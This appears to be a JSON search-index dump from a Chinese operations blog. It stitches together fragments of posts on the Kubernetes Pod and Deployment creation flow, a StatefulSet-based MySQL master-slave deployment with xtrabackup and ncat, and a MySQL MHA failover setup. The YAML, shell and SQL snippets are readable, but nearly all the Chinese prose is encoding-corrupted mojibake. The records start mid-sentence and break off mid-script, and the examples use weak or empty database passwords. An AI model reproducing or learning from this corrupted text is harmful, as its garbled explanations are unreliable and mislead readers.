¹æ®è°ƒåº¦ç®—æ³•é€‰æ‹©ä¸€ä¸ªnodeèŠ‚ç‚¹,å‘Šè¯‰Apiserverè¿™ä¸ªPodåº”è¯¥è¿è¡Œåœ¨å“ªä¸ªèŠ‚ç‚¹ Apiserverå°†è¿™ä¸ªPodå’Œnodeçš„ç»‘å®šä¿¡æ¯æ›´æ–°åˆ°etcd,etcdå°†å†™å…¥ç»“æœå“åº”ç»™Apiserver Kubeleté€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°å½“å‰èŠ‚ç‚¹æœ‰åˆ›å»ºPodçš„é€šçŸ¥,Kubeletè°ƒç”¨dockeråˆ›å»ºå®¹å™¨,Kubeletå°†Podè¿è¡ŒçŠ¶æ€å‘é€ç»™Apiserver Apiserverå°†PodçŠ¶æ€ä¿¡æ¯æ›´æ–°åˆ°etcd ","date":"2021-07-20 10:59","objectID":"/post/2579/:0:1","tags":["k8s"],"title":"k8s åˆ›å»ºpodå’Œdeploymentçš„æµç¨‹","uri":"/post/2579/"},{"categories":["kubernetes"],"content":"2ã€åˆ›å»ºDeploymentæµç¨‹ 26432-2orcxruqs6c.png å›¾ç‰‡æ¥æºä¹¦ç±: kubernetes in action å®¢æˆ·ç«¯å°†åˆ›å»ºDeploymentçš„è¯·æ±‚å‘é€ç»™Apiserver Apiserverå°†Deploymentä¿¡æ¯å†™å…¥etcd,etcdå°†å†™å…¥ç»“æœå“åº”ç»™Apiserver,Apiserverå°†åˆ›å»ºç»“æœå“åº”ç»™å®¢æˆ·ç«¯(æ­¤æ—¶æœªç»è¿‡ControllerManager,deploymentçš„READYçŠ¶æ€ä¸º0) ControllerManageré€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°æ–°å¢çš„Deploymentèµ„æº,Deployment controllerå‘Apiserverå‘é€åˆ›å»ºRSçš„è¯·æ±‚,Apiserverå°†RSä¿¡æ¯å†™å…¥etcdã€‚ã€‚ã€‚ ControllerManageré€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°æ–°å¢çš„ReplicaSetèµ„æº,ReplicaSet controllerå‘Apiserverå‘é€åˆ›å»ºPodçš„è¯·æ±‚,Apiserverå°†Podä¿¡æ¯å†™å…¥etcdã€‚ã€‚ã€‚ Scheduleré€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°æœªè°ƒåº¦çš„Podçš„é€šçŸ¥,æ ¹æ®è°ƒåº¦ç®—æ³•é€‰æ‹©ä¸€ä¸ªnodeèŠ‚ç‚¹,å‘Šè¯‰Apiserverè¿™ä¸ªPodåº”è¯¥è¿è¡Œåœ¨å“ªä¸ªèŠ‚ç‚¹ Apiserverå°†è¿™ä¸ªPodå’Œnodeçš„ç»‘å®šä¿¡æ¯æ›´æ–°åˆ°etcd,etcdå°†å†™å…¥ç»“æœå“åº”ç»™Apiserver Kubeleté€šè¿‡Apiserverçš„watchæ¥å£,è·å–åˆ°å½“å‰èŠ‚ç‚¹æœ‰åˆ›å»ºPodçš„é€šçŸ¥,Kubeletè°ƒç”¨dockeråˆ›å»ºå®¹å™¨,Kubeletå°†Podè¿è¡ŒçŠ¶æ€å‘é€ç»™Apiserver Apiserverå°†PodçŠ¶æ€ä¿¡æ¯æ›´æ–°åˆ°etcd é€šè¿‡Apiserverçš„watchæ¥å£è·å–çš„ä¿¡æ¯ï¼Œéƒ½æ˜¯ç”±Apiserverä¸»åŠ¨é€šçŸ¥çš„ ","date":"2021-07-20 10:59","objectID":"/post/2579/:0:2","tags":["k8s"],"title":"k8s åˆ›å»ºpodå’Œdeploymentçš„æµç¨‹","uri":"/post/2579/"},{"categories":["kubernetes"],"content":"å‰è¨€ åŸæ–‡æ¡£åœ°å€: https://kubernetes.io/zh/docs/tasks/run-application/run-replicated-stateful-application/ ä½¿ç”¨æœ¬æ–‡æ¡£éƒ¨ç½²éœ€è¦é›†ç¾¤ä¸­æå‰é…ç½®å¥½storage-classï¼Œæˆ–è€…æ‰‹åŠ¨åˆ›å»ºpvï¼Œpvc ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:1","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"1.åˆ›å»ºconfigmap mysqlé…ç½®æ–‡ä»¶ --- apiVersion: v1 kind: ConfigMap metadata: name: mysql labels: app: mysql data: master.cnf: | [mysqld] log-bin slave.cnf: | [mysqld] super-read-only ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:2","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"2.åˆ›å»ºsvc --- apiVersion: v1 kind: Service metadata: name: mysql labels: app: mysql spec: ports: - name: mysql port: 3306 clusterIP: None selector: app: mysql --- apiVersion: v1 kind: Service metadata: name: mysql-read labels: app: mysql spec: ports: - name: mysql port: 3306 selector: app: mysql ä¸€ä¸ªheadless serviceå’Œä¸€ä¸ªæ™®é€šserviceï¼Œheadlessç”¨äºstatefulset,ç»™æ¯ä¸ªpodæä¾›ä¸€ä¸ªå›ºå®šçš„dnsè®°å½•ï¼Œæ™®é€šserviceæä¾›è´Ÿè½½å‡è¡¡ ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:3","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"3.åˆ›å»ºstatefulset --- apiVersion: apps/v1 kind: StatefulSet metadata: name: mysql spec: selector: matchLabels: app: mysql # service-headlessä¸ºæ¯ä¸ªpodæä¾›ä¸€ä¸ªå›ºå®šçš„dnsè§£æ,eg:mysql-0.mysql,mysql-1.mysql serviceName: mysql replicas: 3 template: metadata: labels: app: mysql spec: initContainers: # ç”¨äºç”Ÿæˆä¸»ä»é…ç½®æ–‡ä»¶çš„å®¹å™¨ - name: init-mysql image: mysql:5.7 volumeMounts: - name: conf mountPath: /mnt/conf.d - name: config-map mountPath: /mnt/config-map command: - bash - \"-c\" - | set -ex # ä½¿ç”¨æ­£åˆ™åŒ¹é…podåºå·,ç»“æœä¼šå­˜åœ¨BASH_REMATCHå˜é‡ä¸­ [[ `hostname` =~ -([0-9]+)$ ]] || exit 1 # è·å–åºå· ordinal=${BASH_REMATCH[1]} # server-id=0æœ‰ç‰¹å‡ºå«ä¹‰,å› æ­¤ç»™ID+100æ¥é¿å¼€å®ƒ serverid=$(($ordinal+100)) # å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ echo -e \"[mysqld]\\nserver-id=$serverid\" \u003e /mnt/conf.d/server-id.cnf # å¦‚æœæ˜¯ä¸»èŠ‚ç‚¹,å°†ä¸»èŠ‚ç‚¹é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°/mnt/conf.d,è´Ÿè´£å¤åˆ¶ä»èŠ‚ç‚¹ if [[ $ordinal == 0 ]];then cp /mnt/config-map/master.cnf /mnt/conf.d/ else cp /mnt/config-map/slave.cnf /mnt/conf.d/ fi # ç”¨äºä»èŠ‚ç‚¹å®¹å™¨å¯åŠ¨æ—¶å¤åˆ¶æ•°æ® - name: clone-mysql image: registry.cn-shanghai.aliyuncs.com/soulchild/xtrabackup:2.4 volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql command: - bash - -c - | set -ex # å¤åˆ¶æ•°æ®æ“ä½œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡æ²¡æœ‰æ•°æ®çš„æ—¶å€™éœ€è¦,æ‰€ä»¥åˆ¤æ–­æ•°æ®å­˜åœ¨åˆ™è·³è¿‡ [[ -d /var/lib/mysql/mysql ]] \u0026\u0026 exit 0 # æ­£åˆ™åŒ¹é…åºå·,åŒ¹é…å¤±è´¥åˆ™å¼‚å¸¸é€€å‡º [[ `hostname` =~ -([0-9]+$) ]] || exit 1 # è·å–åºå· ordinal=${BASH_REMATCH[1]} # ä¸»èŠ‚ç‚¹ä¸éœ€è¦å¤åˆ¶æ“ä½œ [[ $ordinal == 0 ]] \u0026\u0026 exit 0 # ä½¿ç”¨ncatä»å‰ä¸€ä¸ªèŠ‚ç‚¹ä¸­å¤åˆ¶æ•°æ®,3307ç«¯å£æ˜¯æˆ‘ä»¬å¯åŠ¨çš„ä¸€ä¸ªsidecarå®¹å™¨ï¼Œä»–æ˜¯ä½¿ç”¨ncatè¿è¡Œçš„ä¸€ä¸ªæœåŠ¡,è¿™ä¸ªæœåŠ¡çš„å…·ä½“æ“ä½œå¯ä»¥çœ‹xtrabackupå®¹å™¨çš„é…ç½® ncat --recv-only mysql-$((ordinal-1)).mysql 3307 | xbstream -x -C /var/lib/mysql # --prepareå‚æ•°,åœ¨å¤‡ä»½å®Œæˆåï¼Œæ•°æ®å°šä¸”ä¸èƒ½ç”¨äºæ¢å¤æ“ä½œï¼Œå› ä¸ºå¤‡ä»½çš„æ•°æ®ä¸­å¯èƒ½ä¼šåŒ…å«å°šæœªæäº¤çš„äº‹åŠ¡æˆ–å·²ç»æäº¤ä½†å°šæœªåŒæ­¥è‡³æ•°æ®æ–‡ä»¶ä¸­çš„äº‹åŠ¡. xtrabackup --prepare --target-dir=/var/lib/mysql containers: - name: mysql image: mysql:5.7 ports: - name: mysql containerPort: 3306 env: - name: MYSQL_ALLOW_EMPTY_PASSWORD value: \"1\" volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql - name: conf mountPath: /etc/mysql/conf.d resources: requests: memory: 1Gi cpu: 500m limits: memory: 1Gi cpu: 500m startupProbe: exec: command: [\"mysql\", \"-h\", \"127.0.0.1\", \"-e\", \"select 1\"] livenessProbe: exec: command: [\"mysqladmin\", \"ping\"] initialDelaySeconds: 10 periodSeconds: 10 timeoutSeconds: 5 readinessProbe: exec: command: [\"mysql\", \"-h\", \"127.0.0.1\", \"-e\", \"select 1\"] initialDelaySeconds: 10 periodSeconds: 5 timeoutSeconds: 2 - name: xtrabackup image: registry.cn-shanghai.aliyuncs.com/soulchild/xtrabackup:2.4 volumeMounts: - name: mysql-data mountPath: /var/lib/mysql subPath: mysql - name: conf mountPath: /etc/mysql/conf.d command: - bash - \"-c\" - | set -ex cd /var/lib/mysql # xtrabackupå¤‡ä»½åä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶,æœ‰ä¸¤ç§æƒ…å†µ,xtrabackup_slave_infoå’Œxtrabackup_binlog_info if [[ -f xtrabackup_slave_info ]];then # xtrabackup_slave_infoå­˜åœ¨åˆ™è¡¨ç¤ºè¿™ä¸ªå¤‡ä»½æ¥è‡ªä¸€ä¸ªä»èŠ‚ç‚¹,æ–‡ä»¶åŒ…å«change master to sqlè¯­å¥,å°†è¿™ä¸ªæ–‡ä»¶æ”¹ä¸ºchange_master_to.sql.in cat xtrabackup_slave_info | sed -E 's/;$//g' \u003e change_master_to.sql.in rm -f xtrabackup_slave_info elif [[ -f xtrabackup_binlog_info ]];then # å¦‚æœåªå­˜åœ¨xtrabackup_binlog_infoæ–‡ä»¶åˆ™å¤‡ä»½æ¥è‡ªä¸»èŠ‚ç‚¹,è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†bin-logæ–‡ä»¶åå’Œpositionåç§»é‡,éœ€è¦æˆ‘ä»¬è‡ªå·±è§£ææˆchange master to sql # ä½¿ç”¨æ­£åˆ™è§£æè·å–binlogä¿¡æ¯,å¹¶ç”Ÿæˆchange master to sql [[ `cat xtrabackup_binlog_info` =~ ^(.*?)[[:space:]]+([0-9]+)$ ]] || exit 1 echo \"CHANGE MASTER TO MASTER_LOG_FILE='${BASH_REMATCH[1]}', MASTER_LOG_POS=${BASH_REMATCH[2]}\" \u003e change_master_to.sql.in # åˆ é™¤xtrabackup_binlog_info,é˜²æ­¢ä¸‹ä¸€æ¬¡æ²¡æœ‰ç»è¿‡å¤‡ä»½æ—¶,é‡å¤ç”Ÿæˆchange_master_to.sql.in rm -f xtrabackup_binlog_info fi # åˆ¤æ–­initcontaineræ˜¯å¦è¿›è¡Œäº†å¤‡ä»½,å¦‚æœè¿›è¡Œäº†å¤‡ä»½ä¼šç»è¿‡æˆ‘ä»¬ä¸Šé¢çš„é€»è¾‘ç”Ÿæˆchange_master_to.sql.in,å¦‚æœå­˜åœ¨change_master_to.sql.inï¼Œåˆ™éœ€è¦æ‰§è¡Œç›¸åº”çš„sql if [[ -f change_master_to.sql.in ]];then # ç­‰å¾…mysqlå®¹å™¨å¯åŠ¨ echo 'Waiting for mysqld to be ready (accept connections)' until mysql -h 127.0.0.1 -e 'select 1';do sleep 1;done sleep 5 echo 'Initializing replication from clone position' # æ‰§è¡Œchange master sql sql=\"$(\u003cchange_master_to.sql.in), master_host='mysql-0.mysql', master_user='root', master_password='', master_connect_retry=10; start slave;\" mysql -h 127.0.0.1 -e \"$sql\" || exit 1 # é‡å‘½åchange_master_to.sql.inæ–‡ä»¶ï¼Œé˜²æ­¢é‡å¤æ‰§è¡Œchange master mv change_master_to.sql.in change_master_to.sql.in.orig fi # ä½¿ç”¨ncatç›‘å¬3307ç«¯å£,åœ¨æ”¶åˆ°ä¼ è¾“è¯·æ±‚æ—¶ä¼šæ‰§è¡Œxtrabackupå¤‡ä»½æ“ä½œ,ç„¶åä¼ è¾“æ•°æ®ç»™è¯·æ±‚æ•°æ®çš„èŠ‚ç‚¹ # ä½¿ç”¨ex","date":"2021-07-19 14:21","objectID":"/post/2577/:0:4","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"4. statefulseté…ç½®è¯´æ˜ 4.1 initContainer ä¸‹é¢ä»‹ç»çš„æ˜¯ä¸¤ä¸ªåˆå§‹åŒ–å®¹å™¨é…ç½®ï¼Œä¼šåœ¨podå¯åŠ¨æ—¶ä¼˜å…ˆå¯åŠ¨çš„å®¹å™¨ 1.init-mysqlå®¹å™¨ è¯¥å®¹å™¨æŒ‚è½½äº†ä¸¤ä¸ªvolumeï¼Œåˆ†åˆ«æ˜¯confï¼Œconfig-map(åœ¨volumesä¸­å®šä¹‰)ã€‚confæ˜¯podä¸­å®¹å™¨ä¹‹é—´çš„å…±äº«å·(ä½¿ç”¨çš„emptyDir)ï¼Œconfigmapæ˜¯åˆ†åˆ«åŒ…å«mysqlä¸»ä»çš„é…ç½®æ–‡ä»¶ã€‚confæŒ‚è½½åˆ°/mnt/conf.dç›®å½•ï¼ŒconfigmapæŒ‚è½½åˆ°/mnt/config-mapç›®å½• è¿™ä¸ªå®¹å™¨åœ¨å¯åŠ¨æ—¶ä¼šåˆ¤æ–­å½“å‰podå±å¦ä¸ºmasterèŠ‚ç‚¹ï¼Œè¿™é‡Œçš„mysql-0æŒ‡å®šä¸ºmasterèŠ‚ç‚¹ï¼Œå¦‚æœpod idæ˜¯0åˆ™å°†id+100ä½œä¸ºmysql server-idï¼Œå¹¶å°†é…ç½®å†…å®¹å†™å…¥åˆ°/mnt/conf.d/server-id.confï¼ŒåŒæ—¶å°†mysqlä¸»é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°/mnt/conf.d/ç›®å½•ä¸‹ æ­¤æ—¶confè¿™ä¸ªå·åŒ…å«äº†mysqlä¸»çš„é…ç½®æ–‡ä»¶å’Œserver-idé…ç½®æ–‡ä»¶ 2.clone-mysqlå®¹å™¨ è¿™ä¸ªå®¹å™¨æ˜¯ä¸ºä»èŠ‚ç‚¹å‡†å¤‡çš„,ä»èŠ‚ç‚¹åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶éœ€è¦ä»ä¸»èŠ‚ç‚¹æˆ–å‰ä¸€ä¸ªä»èŠ‚ç‚¹è¿›è¡Œå…¨é‡æ•°æ®åŒæ­¥ åŒæ ·è¿™é‡Œä¹Ÿä½¿ç”¨äº†æ•°æ®å·mysql-dataï¼ŒæŒ‚è½½åˆ°äº†/var/lib/mysqlï¼ŒåŒæ­¥çš„æ•°æ®ä¼šå­˜æ”¾åœ¨/var/lib/mysqlä¸­,æä¾›ç»™mysqlä¸»å®¹å™¨ä½¿ç”¨ mysql-dataæ˜¯é€šè¿‡pvcæ¨¡ç‰ˆé…ç½®ï¼Œè¿™ä¸ªå·çš„å†…å®¹åœ¨æ¯ä¸ªpodä¸­æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™éœ€è¦ä½ çš„k8sé›†ç¾¤ä¸­æ”¯æŒstorage-class 4.2 å¸¸é©»å®¹å™¨ ä¸‹é¢ä»‹ç»çš„æ˜¯podä¸­çš„ä¸¤ä¸ªå¸¸é©»å®¹å™¨ï¼Œä¸€ä¸ªæ˜¯mysqlç”¨äºæä¾›mysqlæœåŠ¡ã€‚å¦ä¸€ä¸ªæ˜¯xtrabackupç”¨äºæä¾›åœ¨å…¶ä»–èŠ‚ç‚¹é¦–æ¬¡å¯åŠ¨æ—¶åŒæ­¥æ•°æ®çš„åŠŸèƒ½å’Œæ‰§è¡Œchange master to sqlå°†å½“å‰èŠ‚ç‚¹é…ç½®ä¸ºä»èŠ‚ç‚¹ 1.mysqlå®¹å™¨ è¿™ä¸ªå®¹å™¨æŒ‚è½½äº†ä¸¤ä¸ªæ•°æ®å·ï¼Œä¸€ä¸ªæ˜¯confç”¨äºå­˜æ”¾mysqlé…ç½®æ–‡ä»¶çš„ï¼ŒæŒ‚è½½åˆ°äº†/etc/mysql/conf.dä¸­ å¦ä¸€ä¸ªæ˜¯mysql-dataç”¨äºå­˜æ”¾mysqlæ•°æ®æ–‡ä»¶ï¼Œè¿™ä¸ªå·æŒ‚è½½åˆ°äº†/var/lib/mysqlä¸‹ï¼Œè¿™ä¸ªç›®å½•çš„æ•°æ®ç”±clone-mysqlå®¹å™¨æä¾› 2.xtrabackupå®¹å™¨ è¿™ä¸ªå®¹å™¨æŒ‚è½½äº†mysql-dataæ•°æ®å·ï¼Œç”¨äºåˆ¤æ–­å½“å‰podä¸­çš„mysqlæ˜¯å¦éœ€è¦æ‰§è¡Œchange to master sql ç¬¬äºŒä¸ªåŠŸèƒ½æ˜¯ä½¿ç”¨ncatå¼€å¯ä¸€ä¸ªå¸¸é©»è¿›ç¨‹ï¼Œæä¾›tcpä¼ è¾“mysqlå¤‡ä»½æ•°æ®çš„èƒ½åŠ› ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:5","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["kubernetes"],"content":"5.æµ‹è¯• ä¸»èŠ‚ç‚¹é€ æ•°æ® k exec -it mysql-0 mysql mysql\u003e create database soulchild; mysql\u003e use soulchild mysql\u003e create table my_test(id int); mysql\u003e insert into my_test values(1); ä»èŠ‚ç‚¹æŸ¥æ•°æ® k exec -it mysql-1 -- mysql -e 'show databases;' +------------------------+ | Database | +------------------------+ | information_schema | | mysql | | performance_schema | | soulchild | | sys | | xtrabackup_backupfiles | +------------------------+ k exec -it mysql-1 -- mysql -e 'use soulchild;show tables;' +---------------------+ | Tables_in_soulchild | +---------------------+ | my_test | +---------------------+ k exec -it mysql-1 -- mysql -e 'use soulchild;select id from my_test;' +------+ | id | +------+ | 1 | +------+ ","date":"2021-07-19 14:21","objectID":"/post/2577/:0:6","tags":["mysql","k8s"],"title":"k8s ä½¿ç”¨statefulsetéƒ¨ç½²mysqlä¸»ä»","uri":"/post/2577/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸€ã€æœºå™¨è§„åˆ’ |ä¸»æœº|IP|è§’è‰² |- |mysql01|172.17.20.240|master |mysql02|172.17.20.241|slave |mysql03|172.17.20.242|slave |manage|172.17.20.150|manage |vip|172.17.20.243|vip| ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:1","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"äºŒã€å®‰è£…mysql å¯å‚è€ƒhttps://soulchild.cn/266.html ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:2","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‰ã€mysqlé…ç½®æ–‡ä»¶ mysql01 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=100 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log mysql02 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=101 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log mysql03 [mysqld] basedir=/usr/local/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=102 read-only=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=test.% replicate-wild-ignore-table=information_schema.% [mysqld_safe] log-error=/var/log/mysql.log ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:3","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å››ã€åˆ›å»ºmysqlè´¦å· æ‰€æœ‰èŠ‚ç‚¹æ‰§è¡Œ # ä¸»ä»å¤åˆ¶è´¦å· grant replication slave on *.* to 'repl_user'@'172.17.%.%' identified by 'soulchild_repl'; # ç®¡ç†å‘˜è´¦å· grant all on *.* to 'root'@'172.17.%.%' identified by 'soulchild'; ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:4","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"äº”ã€å¼€å¯ä¸»ä»åŒæ­¥ 1.æŸ¥çœ‹master bin-logä½ç½® 20774-pif4cv8u1ul.png 2.ä¿®æ”¹slaveä¸ºä»èŠ‚ç‚¹ # mysql02 mysql\u003e change master to master_host='172.17.20.240',master_user='repl_user',master_password='soulchild_repl',master_log_file='mysql-bin.000002',master_log_pos=740; mysql\u003e start slave; # mysql03 mysql\u003e change master to master_host='172.17.20.240',master_user='repl_user',master_password='soulchild_repl',master_log_file='mysql-bin.000002',master_log_pos=740; mysql\u003e start slave; ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:5","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å…­ã€ä¸‹è½½å®‰è£…MHAå·¥å…· ä¸‹è½½åœ°å€: https://github.com/yoshinorim/mha4mysql-manager/releases https://github.com/yoshinorim/mha4mysql-node/releases https://code.google.com/archive/p/mysql-master-ha/downloads # æ‰€æœ‰mysqlèŠ‚ç‚¹å®‰è£…nodeåŒ… yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm # managerèŠ‚ç‚¹ yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm mha4mysql-manager-0.58-0.el7.centos.noarch.rpm ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:6","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸ƒã€é…ç½®æ‰€æœ‰èŠ‚ç‚¹SSHå…å¯†ç™»å½• ç•¥ ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:7","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å…«ã€é…ç½®mha-manager ä»¥ä¸‹æ“ä½œåœ¨managerèŠ‚ç‚¹æ‰§è¡Œ 1.åˆ›å»ºç›¸å…³æ–‡ä»¶ç›®å½• mkdir /etc/mha/ touch /etc/mha/app1.conf 2.ç¼–å†™é…ç½®æ–‡ä»¶ vim /etc/mha/app1.conf [server default] # mysqlç®¡ç†å‘˜ç”¨æˆ·åå¯†ç  user=root password=soulchild # sshçš„ç”¨æˆ· ssh_user=root # ä¸»ä»å¤åˆ¶çš„ç”¨æˆ·åå¯†ç  repl_user=repl_user repl_password=soulchild_repl # mysqläºŒè¿›åˆ¶æ—¥å¿—è·¯å¾„,ä¹Ÿå¯ä»¥å•ç‹¬å†™åœ¨å•ç‹¬serveréƒ¨åˆ†ä¸­ master_binlog_dir=/data/mysql/ # æ‰§è¡ŒpingSQLè¯­å¥çš„é¢‘ç‡ ping_interval=1 # mha-managerçš„æ—¥å¿—è·¯å¾„ manager_log=/var/log/mha/app1/manager.log manager_workdir=/var/log/mha/app1 [server1] # mysqlä¸»æœºip hostname=172.17.20.240 port=3306 # ä¼˜å…ˆå°†æ­¤æœåŠ¡å™¨è®¾ç½®ä¸ºä¸» candidate_master=1 # é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœslaveè½åäºmasterè¶…è¿‡100MBçš„ä¸­ç»§æ—¥å¿—,MHAä¸ä¼šé€‰æ‹©è¿™å°ä»ä½œä¸ºæ–°çš„master,è®¾ç½®check_repl_delay=0ä¼šå¿½ç•¥è¿™ä¸ªæœºåˆ¶ check_repl_delay=0 [server2] hostname=172.17.20.241 port=3306 master_binlog_dir=/data/mysql [server3] hostname=172.17.20.242 port=3306 candidate_master=1 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:8","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¹ã€æ£€æŸ¥é…ç½® 1.æ£€æŸ¥sshå…å¯†é…ç½®,åœ¨managerèŠ‚ç‚¹ masterha_check_ssh --conf=/etc/mha/app1.conf 11186-2wqivpvc0p7.png 2.æ£€æŸ¥ä¸»ä»çŠ¶æ€ masterha_check_repl --conf=/etc/mha/app1.conf 42710-33fqfj426tq.png è¿™é‡ŒæŠ¥é”™æ‰¾ä¸åˆ°mysqlbinlogï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹,å†æ¬¡æ‰§è¡Œæ£€æŸ¥ï¼Œçœ‹åˆ°MySQL Replication Health is OK.å°±ä»£è¡¨æ²¡é—®é¢˜äº† ln -s /usr/local/mysql/bin/mysqlbinlog /usr/bin/ ln -s /usr/local/mysql/bin/mysql /usr/bin/ ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:9","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åã€å¯åŠ¨mha-manager nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 é»˜è®¤æƒ…å†µä¸‹ä¸¤æ¬¡å®•æœºæ—¶é—´ä¸è¶³8å°æ—¶(â€“last_failover_minute=480)ï¼Œæ˜¯ä¸ä¼šæ‰§è¡Œfailoverçš„ï¼Œä½¿ç”¨â€“ignore_last_failoverå‚æ•°ä¼šå¿½ç•¥è¿™ä¸ªæœºåˆ¶ã€‚ å¦‚æœä¸è®¾ç½®â€“ignore_last_failoverå‚æ•°ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨åˆ é™¤[manager_workdir]/xxx.failover.xxxæ–‡ä»¶ æ£€æŸ¥è¿è¡ŒçŠ¶æ€ masterha_check_status --conf /etc/mha/app1.conf 34753-r122eijri.png åœæ­¢mha: masterha_stop --conf /etc/mha/app1.conf ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:10","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åä¸€ã€æ•…éšœæ¨¡æ‹Ÿ 1.åœæ­¢master systemctl stop mysqld 2.æŸ¥çœ‹å½“å‰masteræ˜¯å¦åˆ‡æ¢ 39079-lzrgecfm5o.png 3.å°†æ—§masterä½œä¸ºslaveåŠ å…¥åˆ°é›†ç¾¤ # æŸ¥çœ‹manageræ—¥å¿—,å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹,å°†xxxæ”¹ä¸ºrepl_userçš„å¯†ç ï¼Œåœ¨æ—§masterèŠ‚ç‚¹ä¸Šæ‰§è¡Œ CHANGE MASTER TO MASTER_HOST='172.17.20.242', MASTER_PORT=3306, MASTER_LOG_FILE='mysql-bin.000001', MASTER_LOG_POS=740, MASTER_USER='repl_user', MASTER_PASSWORD='xxx'; # å¯åŠ¨slave start slave; 4.å†æ¬¡å¯åŠ¨mha-manager nohup masterha_manager --conf=/etc/mha/app1.conf --ignore_last_failover \u0026\u003e /var/log/mha/app1/app1_start.log \u0026 ","date":"2021-07-12 16:56","objectID":"/post/2568/:0:11","tags":["mysql","mha"],"title":"mysql MHAéƒ¨ç½²é…ç½®","uri":"/post/2568/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åäºŒã€é…ç½®vipæ¼‚ç§»è„šæœ¬ 1.åˆ›å»ºç›®å½• mkdir /etc/mha/scripts/ 2.ç¼–å†™è„šæœ¬ vim /etc/mha/scripts/master_ip_failover éœ€è¦ä¿®æ”¹$vip,$key,$ssh_start_vip, $ssh_stop_vip #!/usr/bin/env perl use strict; use warnings 